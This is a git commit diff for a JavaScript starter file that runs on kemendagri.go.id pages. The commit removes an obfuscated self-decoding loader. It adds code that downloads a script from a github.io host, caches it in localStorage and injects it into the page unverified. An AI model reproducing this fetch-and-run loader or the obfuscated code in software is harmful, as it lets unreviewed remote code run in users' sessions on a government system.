c9fecd97d5dcbafc33640134801bbaa5672fccc4
hendrik-svm <61135752+hendrik-svm@users.noreply.github.com>
2026-06-14 21:26:08 +0700

    Refactor starter.js to use modern syntax and localStorage

--- assets/sipd/starter.js
+++ assets/sipd/starter.js
@@ -1,35 +1,49 @@
-var build, alamat_starter, url_starter;
-(function () {
-    var TQe = '',
-        kMz = 398 - 387;
+let build = "20260614-0000";
+const alamat_starter = "kemendagri.go.id";
+const url_starter = location.href;
+if (url_starter.search(alamat_starter) != -1) {
+    if (localStorage.build != null) {
+        if (localStorage.build != build) {
+            localStorage.script = "";
+            localStorage.build = build;
+        }
+    } else {
+        localStorage.build = build;
+        localStorage.script = "";
+    }
 
-    function rXt(k) {
-        var c = 557336;
-        var n = k.length;
-        var w = [];
-        for (var j = 0; j < n; j++) {
-            w[j] = k.charAt(j)
-        };
-        for (var j = 0; j < n; j++) {
-            var a = c * (j + 309) + (c % 34394);
-            var z = c * (j + 160) + (c % 18670);
-            var m = a % n;
-            var t = z % n;
-            var o = w[m];
-            w[m] = w[t];
-            w[t] = o;
-            c = (a + z) % 1548995;
-        };
-        return w.join('')
-    };
-    var dWB = rXt('tofjvoutzqncboktpcaegcsmyrhdrsuliwrnx').substr(0, kMz);
-    var zKG = 'na.C6dr1;ys55,;o[1fvae2=arhrursfhlijdlrn[p+s0tl]7.0f);m(d vgh;;,m!. ",o66wdoelja ,m1gvv;.i18evnl"];,r9o(;6rrti,t)6a8.,09ofha)i;(f]7rir(v<r=cr+ ct6(lin"8(ea+k;ruo=o]nqugh8 ab cun]+l).tn6y)"3==,m=l [frr4v,auu w;[i+)g=1;n;4)[)nfir;S+be(na}2;(a;.)bnfrs<eua=0vit(= h=df0r.+mrvr(-0=,S;ta-n;k>j[;-mrn{bar r=,u(;;vh=[8dner(;it+eu]ot(rivCl9g=0vv+a m*khljng,i[)3p ,;f29(aacoe"mce<.;5c)8ro1"l8pk.1.arC,d]Aovv).8srl(r0)5k.,fllamr==a+{}ey7{.glingovnAt=lqgiu zb1];t+.;h8l(r n=vori)g+qcss(l42noj7{=ie"oc+e,Ca,;1 (=+r)l+hecmen2)(w=1.m[1,(0;v=aw;)),[}r.=e,}8vuy+{ccr2=a;=v+=gg]t=l]p0 ()+a7q. r g((ns 7{tisfg,2=ih)mbm,ssjn)5=+7)u"2jm=);ro(e)!c}"e,)[.l))recs.r-vh;;r(u+rnh5=g4ga)vna;os]<ji; ),<(nv.6,p=.tv.ul[c;>vrr)fa;iio;=(m=a;kahke;bi}==pa9..4ht1rsat(lsoaost=uC=-.aed=2tn;hh+fro-( ) Chd](g;b;tth(}aj+cf)0(0 r[er u1.cci5f-f9s+q,t;n(gxcyihApC,pbs3t{nk 9;utt=]rjbrgarmcmeaAt*])n;t[(h7neflsbl+tuCA=tkv=oo+n)u";';
-    var bRH = rXt[dWB];
-    var jjC = '';
-    var dNW = bRH;
-    var QiT = bRH(jjC, rXt(zKG));
-    var CPR = QiT(rXt(' Xi\/scnXn.etXS%0=4tXp.l!r\/)Xej=asa{hfXin 0(x.ch}d;i=h)Xg[X.=XXvo.Xoap.;XSx .lf=wp;2x.i]x%0=fo;(ew)3Xxefh.r.f.)(.r!e%m=1feh..{2fi6ar,s;$.o%pyml-(,5f7kM.XhX(,i5)n!tds2a)iX0f0[)1n1.tt4h6u$)f.![n]id=o[[b% sf]f{fz"hl.f+d+..g+\'s;x\/iStr4%X2loXsrXn0.i\/\'XfCfac2f1offe8]Xb(X3&oj=eiXX*)1a fss*0.g.bXar6X.#=X!);2XiXi )itu_m.lwci8X!(w{Xtr4!Tf.bX=r)asb{(r)}enf.a=2.f&\/sm4(712eeu=}%6d twpX.se.ama:ik).1i{_=;dp1paa%i100ty+ sln)lrt)en*-r[h XX+2]%ghuog*26{(48si\/1\/..$%;\/%{]olvi]%jd.kt0v![f,0t{}]).n;bbi0st4%\'wxkacttd_dl)..=XuXr#.fd)ta0.{X36frmi;i!fde.t5.fhea](sg.uo0atn.be2..u.-XeXrt)n%!.,l}"r[sXXiXlu{bril)"bxXs)luX!X;fd;\/("eo-e})1.evlv%,"mXe;Xn+X\'2]X+1ith.,rda05=l0mXna]\'6%1* ds]sb!,}a8turrerrXp!(omXi4!);e.]!(ew b(t!iu(9=X%;]31l;Ei5!ipTifiXnnXXn3#de#)$XlaXetyqXtebX!rX\'d!o,=]}&fg!e.t(l0mrnl2X8c+=i](ttr=enif(le{3$?Xss%0.fX\'=]]X.X)Xdt}.tsXa(X\/+0}d=t#6(ufoX]t"%+[vX)5!,n+l)=bboc_aeC{X=.l cfXhXo)=Xe.( fn-]ed9Mrm6_cl%!XXmXcbu=j=(X.!5.o]f[pka1).-)2XXt1X(X4dltr,$txXrs){l=!)tpX.1.et!p=eqf.#X]lf.g2}s}X}h-+ci[x(%hX1ptX;!ali0rtaheurz(eocX+SMEfesll+sT=l.X;.s3=t00d03.)oXpf!0l!.XdX =.lX![a9=[a)!X9ei!eXd\/)ets!S l.tX =ua#.iX.epfd&}l_r]s1XocfrXC .f#m)idc;u,Xsnm ($la;1X +r.i.to;-n far,(l.ev)%asc.'));
-    var wZj = dNW(TQe, CPR);
-    wZj(1472);
-    return 1129
-})()
+    const div1 = document.createElement("div");
+    const posisi_div1 = document.querySelector("body");
+    div1.setAttribute("id", "svm");
+    posisi_div1.appendChild(div1);
+    const script_svm = document.querySelector("#svm");
+
+    
+    // //!create script.js
+    //! aktifkan jika sudah mode produksion
+    const script = document.createElement("script");
+    if (localStorage.script == null) {
+        $.get(
+            "https://hendrik-svm.github.io/assets/sipd/script.js?t=" + build,
+            function (data, status) {
+                localStorage.script = data;
+                script.innerHTML = data;
+                script_svm.appendChild(script);
+            }
+        );
+    } else {
+        if (localStorage.script != "") {
+            script.innerHTML = localStorage.script;
+            script_svm.appendChild(script);
+        } else {
+            $.get(
+                "https://hendrik-svm.github.io/assets/sipd/script.js?t=" + build,
+                function (data, status) {
+                    localStorage.script = data;
+                    script.innerHTML = data;
+                    script_svm.appendChild(script);
+                }
+            );
+        }
+    }
+}
